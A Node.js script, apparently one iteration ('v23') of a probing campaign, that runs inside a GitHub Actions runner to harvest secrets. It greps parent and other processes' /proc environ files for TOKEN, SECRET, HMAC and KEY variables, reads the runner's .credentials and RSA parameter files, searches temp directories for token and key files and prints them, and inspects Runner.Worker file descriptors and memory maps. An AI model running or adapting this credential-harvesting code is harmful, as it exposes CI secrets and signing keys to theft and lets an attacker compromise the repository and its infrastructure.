const https = require('https');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

// v23: Runner filesystem + process inspection
// Goal: find HMAC key material, credentials, or other secrets in runner FS/procs

const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
const RUNNER_TEMP = process.env.RUNNER_TEMP || '';
const RUNNER_TOOL_CACHE = process.env.RUNNER_TOOL_CACHE || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID || '';
const GITHUB_WORKSPACE = process.env.GITHUB_WORKSPACE || '';

function run(cmd) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: 5000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 100).trim(); }
}

function readSafe(p, maxBytes) {
  try {
    const content = fs.readFileSync(p);
    const len = content.length;
    if (len === 0) return '(empty)';
    const str = content.toString('utf8').substring(0, maxBytes || 500);
    return str + (len > (maxBytes || 500) ? '...(len=' + len + ')' : '');
  } catch(e) {
    return 'ERR: ' + e.message;
  }
}

function findFiles(dir, depth) {
  if (depth <= 0) return [];
  let results = [];
  try {
    const entries = fs.readdirSync(dir, { withFileTypes: true });
    for (const e of entries) {
      const fp = path.join(dir, e.name);
      if (e.isFile()) results.push(fp);
      else if (e.isDirectory() && !e.name.startsWith('.git')) {
        results = results.concat(findFiles(fp, depth - 1));
      }
    }
  } catch(e) {}
  return results;
}

async function main() {
  console.log('=== V23: Runner filesystem + process inspection ===');
  console.log('RUNNER_TEMP:', RUNNER_TEMP, '| WORKSPACE:', GITHUB_WORKSPACE);
  console.log('Run:', GITHUB_RUN_ID, '| Repo:', GITHUB_REPOSITORY);

  // === PART 1: Runner process inspection ===
  console.log('\n=== PART 1: Runner processes (parent processes) ===');
  console.log('[PS] All runner-related processes:');
  console.log(run('ps aux | grep -E "runner|actions|dotnet" | grep -v grep | head -20'));

  // Find the runner daemon PID
  console.log('\n[PS] Runner binary:');
  console.log(run('which Runner.Worker Runner.Listener dotnet 2>/dev/null || true'));
  console.log(run('find /home/runner/runners /opt/runner /usr/local/bin -name "Runner.Worker" -o -name "Runner.Listener" 2>/dev/null | head -5'));

  // === PART 2: Check process environment of parent processes ===
  console.log('\n=== PART 2: Parent process environment ===');
  const ppid = process.ppid;
  const pppid = parseInt(run('cat /proc/' + ppid + '/status | grep PPid | awk \'{print $2}\'') || 0);
  console.log('[PROC] My PID:', process.pid, '| PPID:', ppid, '| PPPID:', pppid);

  // Try to read parent env
  const parentEnvPath = '/proc/' + ppid + '/environ';
  const parentEnv = run('cat ' + parentEnvPath + ' 2>/dev/null | tr "\\0" "\\n" | grep -E "HMAC|SECRET|TOKEN|KEY|CRED|AUTH|RUNNER_SECRET|ACTIONS_HMAC|SHARED|SIGNING" | head -20');
  if (parentEnv && !parentEnv.startsWith('ERR:')) {
    console.log('[PARENT_ENV] Interesting vars in parent process:');
    console.log(parentEnv);
  } else {
    console.log('[PARENT_ENV] Cannot read parent env:', parentEnv);
  }

  // Try grandparent (the runner daemon)
  const gpEnvPath = '/proc/' + pppid + '/environ';
  const gpEnv = run('cat ' + gpEnvPath + ' 2>/dev/null | tr "\\0" "\\n" | grep -E "HMAC|SECRET|TOKEN|KEY|CRED|AUTH|SIGNING|SHARED" | head -20');
  if (gpEnv && !gpEnv.startsWith('ERR:')) {
    console.log('[GP_ENV] Interesting vars in grandparent process:');
    console.log(gpEnv);
  } else {
    console.log('[GP_ENV]:', gpEnv.substring(0, 100));
  }

  // Full env of parent to find runner-specific vars
  const parentFullEnv = run('cat /proc/' + ppid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -v "^$" | head -50');
  if (parentFullEnv && !parentFullEnv.startsWith('ERR:')) {
    console.log('[PARENT_FULL_ENV] All parent env vars:');
    console.log(parentFullEnv);
  }

  // === PART 3: Runner configuration files ===
  console.log('\n=== PART 3: Runner configuration files ===');

  // Runner configuration is usually at ~/.runner or the runner install dir
  const runnerConfigPaths = [
    '/home/runner/.runner',
    '/home/runner/work/_temp/.runner',
    '/home/runner/runners/.runner',
    '/etc/actions-runner/.runner',
    RUNNER_TEMP + '/.runner',
    // The runner also writes a .credentials file
    '/home/runner/.credentials',
    '/home/runner/.credentials_rsaparams',
    '/home/runner/work/.credentials',
    RUNNER_TEMP + '/.credentials',
  ];
  for (const p of runnerConfigPaths) {
    const content = readSafe(p, 300);
    if (!content.startsWith('ERR:')) {
      console.log('[CONFIG] ' + p + ':');
      console.log(content);
    }
  }

  // === PART 4: Temp directory inspection ===
  console.log('\n=== PART 4: Temp directory contents ===');
  console.log('[TEMP] $RUNNER_TEMP contents:');
  console.log(run('ls -la ' + RUNNER_TEMP + ' 2>/dev/null | head -30'));
  console.log('[TEMP] Files in RUNNER_TEMP:');
  console.log(run('find ' + RUNNER_TEMP + ' -maxdepth 3 -type f 2>/dev/null | head -40'));

  // Look for credential/token files in temp
  console.log('[TEMP] Token/credential files:');
  console.log(run('find ' + RUNNER_TEMP + ' -maxdepth 5 -type f | xargs grep -l "token\\|secret\\|hmac\\|key\\|credential\\|bearer" 2>/dev/null | head -10'));

  // === PART 5: Look for runner message file (contains job secrets) ===
  console.log('\n=== PART 5: Runner message/job context files ===');
  // The runner receives a "job message" from the broker that contains secrets
  // This might be temporarily stored on disk
  const sensitiveFiles = run('find /home/runner /tmp /var/tmp -maxdepth 6 -type f \\( -name "*.json" -o -name "*.token" -o -name "*.key" -o -name "*.credentials" -o -name "context.json" -o -name "job.json" \\) 2>/dev/null | head -30');
  console.log('[SENSITIVE] JSON/token/key files:');
  console.log(sensitiveFiles);

  // Read any interesting found files
  if (sensitiveFiles && !sensitiveFiles.startsWith('ERR:')) {
    for (const fp of sensitiveFiles.split('\n').filter(Boolean).slice(0, 5)) {
      console.log('[FILE] ' + fp + ':');
      console.log(readSafe(fp, 200));
    }
  }

  // === PART 6: Check /proc for the runner's open file descriptors ===
  console.log('\n=== PART 6: Runner process file descriptors ===');
  // The runner process might have an open fd to the secret store
  const procs = run('pgrep -f "Runner.Worker\\|runner.worker" 2>/dev/null | head -3');
  console.log('[PROCS] Runner.Worker PIDs:', procs);
  if (procs && !procs.startsWith('ERR:')) {
    for (const pid of procs.split('\n').filter(Boolean).slice(0, 2)) {
      const fds = run('ls -la /proc/' + pid + '/fd 2>/dev/null | head -20');
      console.log('[FD] PID ' + pid + ' open files:');
      console.log(fds);
      // Try to read the maps to find memory-mapped credential files
      const maps = run('grep -E "json|token|cred|secret" /proc/' + pid + '/maps 2>/dev/null | head -10');
      if (maps && !maps.startsWith('ERR:')) {
        console.log('[MAPS] PID ' + pid + ' interesting mappings:', maps);
      }
    }
  }

  // === PART 7: Check job orchestration context ===
  console.log('\n=== PART 7: Orchestration context files ===');
  const orchPaths = [
    GITHUB_WORKSPACE + '/../_temp',
    GITHUB_WORKSPACE + '/../../_temp',
    '/home/runner/work/_temp',
    '/home/runner/work/_actions',
  ];
  for (const dir of orchPaths) {
    const listing = run('ls -la ' + dir + ' 2>/dev/null | head -20');
    if (!listing.startsWith('ERR:') && listing.length > 0) {
      console.log('[ORCH] ' + dir + ':');
      console.log(listing);
    }
  }

  // === PART 8: Memory scan for HMAC key patterns ===
  console.log('\n=== PART 8: Accessible memory / proc patterns ===');
  // Look for any file in /proc/*/mem that contains "hmac" or "signing"
  // (usually not readable without elevated perms, but worth checking)
  const ourPid = process.pid;
  const smaps = run('grep -E "heap|stack" /proc/' + ourPid + '/smaps 2>/dev/null | head -5');
  console.log('[SMAPS] Our process memory layout:', smaps.substring(0, 200));

  // Check if we can read other processes' environments
  const allPids = run('ls /proc | grep -E "^[0-9]+$" | head -20');
  let accessibleEnvs = [];
  for (const pid of allPids.split('\n').filter(Boolean)) {
    const env = run('cat /proc/' + pid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -c "." 2>/dev/null');
    if (env && !env.startsWith('ERR:') && parseInt(env) > 0) {
      accessibleEnvs.push(pid);
    }
  }
  console.log('[PROC_ACCESS] PIDs with readable env:', accessibleEnvs.join(', '));

  // For each accessible env, look for secrets
  for (const pid of accessibleEnvs.slice(0, 10)) {
    const env = run('cat /proc/' + pid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -E "HMAC|SIGNING|SECRET_KEY|RUNNER_TOKEN|RUNNER_SECRET" | head -5');
    if (env && !env.startsWith('ERR:') && env.trim().length > 0) {
      console.log('[SECRET_ENV] PID ' + pid + ':', env);
    }
  }

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message));
